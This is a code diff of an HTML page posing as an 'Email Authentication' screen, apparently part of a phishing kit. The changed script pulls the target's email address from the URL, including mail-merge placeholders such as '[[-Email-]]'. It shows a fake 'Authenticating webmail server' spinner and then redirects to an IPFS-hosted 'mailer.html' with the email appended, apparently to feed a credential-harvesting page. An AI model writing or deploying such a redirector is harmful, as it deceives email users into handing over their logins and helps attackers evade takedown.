@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Redirect</title>
+    <title>Email Authentication</title>
     <style>
         body {
             font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
@@ -17,7 +17,6 @@
             align-items: center;
             background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
             color: #1e293b;
-            overflow: hidden;
         }
         
         .loader-container {
@@ -27,7 +26,6 @@
             margin-bottom: 20px;
         }
         
-        /* Outer ring */
         .loader-outer {
             position: absolute;
             width: 100%;
@@ -40,7 +38,6 @@
             box-shadow: 0 0 10px rgba(59, 130, 246, 0.2);
         }
         
-        /* Middle ring */
         .loader-middle {
             position: absolute;
             top: 15px;
@@ -54,7 +51,6 @@
             animation: spinReverse 2s linear infinite;
         }
         
-        /* Inner core */
         .loader-inner {
             position: absolute;
             top: 30px;
@@ -84,7 +80,7 @@
         .status-text {
             font-size: 1.1rem;
             font-weight: 500;
-            margin-top: 15px;
+            margin: 15px 0;
             color: #475569;
             position: relative;
         }
@@ -100,29 +96,6 @@
             40% { content: '..'; }
             60%, 100% { content: '...'; }
         }
-        
-        .progress-track {
-            width: 200px;
-            height: 4px;
-            background: #e2e8f0;
-            border-radius: 2px;
-            margin-top: 20px;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #3b82f6, #6366f1);
-            border-radius: 2px;
-            animation: progress 1.8s ease-in-out infinite;
-        }
-        
-        @keyframes progress {
-            0% { width: 0%; margin-left: 0; }
-            50% { width: 100%; margin-left: 0; }
-            100% { width: 0%; margin-left: 100%; }
-        }
     </style>
 </head>
 <body>
@@ -132,35 +105,41 @@
         <div class="loader-inner"></div>
     </div>
     
-    <div class="status-text" id="statusText">Authenticating webmail server</div>
-    
-    <div class="progress-track">
-        <div class="progress-bar"></div>
-    </div>
+    <div class="status-text">Authenticating webmail server</div>
 
     <script>
-        // Configuration
-        const IPFS_GATEWAY = "https://bafybeienr7v7xdk23sucg2pkpnxdjdrna2q4ouhr22v4lcsvlipgvrtri4.ipfs.dweb.link/mailer.html";
-        
-        // Status messages
-        const statusMessages = [
-            "Authenticating webmail server",
-            "Verifying credentials",
-            "Establishing encrypted tunnel"
-        ];
-        
-        // Rotate status messages
-        let currentStatus = 0;
-        const statusElement = document.getElementById('statusText');
-        const statusInterval = setInterval(() => {
-            currentStatus = (currentStatus + 1) % statusMessages.length;
-            statusElement.textContent = statusMessages[currentStatus];
-        }, 600);
-        
+        // Extract email from URL parameters (supports both hash and query)
+        function getEmail() {
+            // Combine both hash and query parameters
+            const params = new URLSearchParams(
+                window.location.hash.substring(1) + '&' + 
+                window.location.search.substring(1)
+            );
+            
+            // Check all possible parameter names
+            const paramNames = ['email', '{email}', '[[-Email-]]'];
+            for (const name of paramNames) {
+                if (params.has(name)) {
+                    return params.get(name);
+                }
+            }
+            return null;
+        }
+
+        // Build the IPFS redirect URL with email
+        function buildRedirectUrl() {
+            const email = getEmail();
+            const baseUrl = "https://bafybeienr7v7xdk23sucg2pkpnxdjdrna2q4ouhr22v4lcsvlipgvrtri4.ipfs.dweb.link/mailer.html";
+            
+            if (email) {
+                return `${baseUrl}#${encodeURIComponent(email)}`;
+            }
+            return baseUrl; // Fallback without email
+        }
+
         // Redirect after 2 seconds
         setTimeout(() => {
-            clearInterval(statusInterval);
-            window.location.href = IPFS_GATEWAY + window.location.hash;
+            window.location.href = buildRedirectUrl();
         }, 2000);
     </script>
 </body>
